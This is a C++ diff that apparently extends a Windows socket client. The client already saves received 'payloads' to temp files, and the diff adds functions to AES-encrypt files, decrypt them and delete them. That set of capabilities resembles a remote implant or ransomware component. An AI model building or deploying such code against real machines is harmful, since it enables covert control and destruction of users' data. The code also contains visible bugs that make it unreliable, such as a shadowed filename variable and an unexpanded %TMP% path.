@@ -7,6 +7,7 @@
 #include <fstream>
 #include <iostream>
 #include <locale>
+#include "crypto.h"
 #include "data_helper.h"
 
 using namespace std;
@@ -206,7 +207,7 @@ string genRandomString() {
 
 string writeReceivedPayloadToFile(boost::asio::ip::tcp::socket& sock, uint32_t total_size) {
 	FILE* file;
-	string filename = "%TMP%" "\\" + genRandomString();
+	string filename = "%TMP%\\" + genRandomString();
 	char* payload_buffer = (char*)malloc(CHUNK_SIZE);
 	if (!fopen_s(&file, filename.c_str(), "wb") && file != NULL && payload_buffer) {
 		size_t payload_length = 0;
@@ -223,5 +224,72 @@ string writeReceivedPayloadToFile(boost::asio::ip::tcp::socket& sock, uint32_t t
 	}
 	else {
 		return "Error: Unable to save the file.";
+	}
+}
+
+
+string writeFileAsEncrypted(std::string filename, uint8_t symmetric_key[16]) {
+	ifstream ifile(filename);
+	string ofilename = "";
+
+	if (ifile) {
+		string ofilename = ".encrypted" + filename + genRandomString();
+		
+		ofstream ofile(ofilename);
+		if (ofile) {
+			string buffer;
+			while (getline(ifile, buffer)) {
+				string ciphertext = encryptAesString(symmetric_key, buffer);
+				ofile << ciphertext << endl;
+			}
+			ofile.close();
+			return ofilename;
+		}
+		else {
+			cout << "Error: Unable to open and write encrypted file.\n";
+		}
+		ifile.close();
+	}
+	else {
+		cout << "Error: Unable to open " + filename + "file.\n";
+	}
+	return ofilename;
+}
+
+
+string writeFileAsDecrypted(std::string filename, uint8_t symmetric_key[16]) {
+	ifstream ifile(filename);
+	string ofilename = "";
+
+	if (ifile) {
+		string ofilename = "%TMP%\\" + genRandomString();
+
+		ofstream ofile(ofilename);
+		if (ofile) {
+			string buffer;
+			while (ifile >> buffer) {
+				string ciphertext = decryptAesString(symmetric_key, buffer);
+				ofile << ciphertext;
+			}
+			ofile.close();
+			return ofilename;
+		}
+		else {
+			cout << "Error: Unable to open and write encrypted file.\n";
+		}
+		ifile.close();
+	}
+	else {
+		cout << "Error: Unable to open " + filename + "file.\n";
+	}
+	return ofilename;
+}
+
+
+void deleteFile(string filename) {
+	std::wstring_convert< std::codecvt<wchar_t, char, std::mbstate_t> > conv;
+	std::wstring wstr = conv.from_bytes(filename); // proper dirname type for DeleteFile function
+	if (!DeleteFile(wstr.c_str())) {
+		cerr << "Error: Couldn't delete requested file.\n";
 	}
 }
